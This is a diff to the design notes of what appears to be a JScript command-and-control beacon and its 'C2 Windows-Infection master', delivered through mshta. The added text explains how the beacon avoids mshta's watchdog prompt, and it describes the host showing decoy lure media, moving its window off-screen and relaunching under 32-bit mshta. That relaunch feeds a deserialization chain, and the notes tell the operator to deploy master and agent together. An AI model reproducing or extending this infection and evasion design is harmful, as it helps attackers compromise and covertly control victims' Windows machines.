@@ -34,6 +34,16 @@ window and process manipulation. The agent itself performs none. Concretely:
 - It **returns** instead of exiting: `'exit'` (operator sent Exit) or `'fail'` (endpoint unset,
   non-200 answer, or POST exception). The host decides what to do — typically quit the host
   process on either value.
+- **mshta is async** (2026-09-08): mshta's slow-script watchdog pops a modal for any script
+  activation that never yields — and behind the host master's hidden window that modal is
+  invisible and blocking. Under mshta (`typeof setTimeout != 'undefined'` and no `WScript`)
+  the beacon loop therefore runs one `setTimeout` activation per cycle, opens the transport
+  async (`open(..., true)`) and peeks it with `waitForResponse(0)` on a 50 ms tick (90 s hard
+  deadline); `runAgent()` returns `'async'` immediately after scheduling, and the final status
+  is delivered by calling the host-defined **`onAgentDone(status)`** hook when the loop
+  unwinds. The master gates on it: `if (runAgent() == 'async') return; quitHost();`. Under WSH
+  (cscript/wscript — no timers, no watchdog) the loop stays fully synchronous and returns
+  `'exit'`/`'fail'` directly; `onAgentDone` is never called there.
 - It calls `dbg(s)` **only if the host defined one** (`typeof dbg != 'undefined'` guard) — a
   host-provided debug logger that receives every log line. Under cscript, `log()` also echoes to
   stdout regardless of `dbg`.
@@ -44,12 +54,16 @@ window and process manipulation. The agent itself performs none. Concretely:
 The C2 Windows-Infection master is the reference host: it emits `setHUrl()` (writes `H_URL`),
 `openDecoy()` (lure media, gated to the x86 host), `hideWindow()` (resize + move off-screen),
 `ensureX86Host()` (re-launch the polyglot under `%WINDIR%\SysWOW64\mshta.exe` on 64-bit hosts —
-the x86 CLR is the only usable UpgradeNetFramework target on every 64-bit OS incl. ARM64), then
-`runAgent()`, then `quitHost()`:
+the x86 CLR is the only usable UpgradeNetFramework target on every 64-bit OS incl. ARM64), an
+`onAgentDone(status) { quitHost(); }` hook, then:
 
 ```
-setHUrl(); [openDecoy();] hideWindow(); if (ensureX86Host()) return; runAgent(); quitHost();
+setHUrl(); [openDecoy();] hideWindow(); if (ensureX86Host()) { exitProcess(); return; }
+if (runAgent() == 'async') return; quitHost();
 ```
+
+LOCKSTEP: a pre-async master paired with this core quits mshta the instant `runAgent()`
+returns `'async'` — no beacon ever fires. Deploy the master (C2) and the agent core together.
 
 The x86 re-host matters because the UpgradeNetFramework-delivered deserialization chain needs an x86 CLR
 process; the pure beacon loop runs in any bitness (and standalone under cscript).
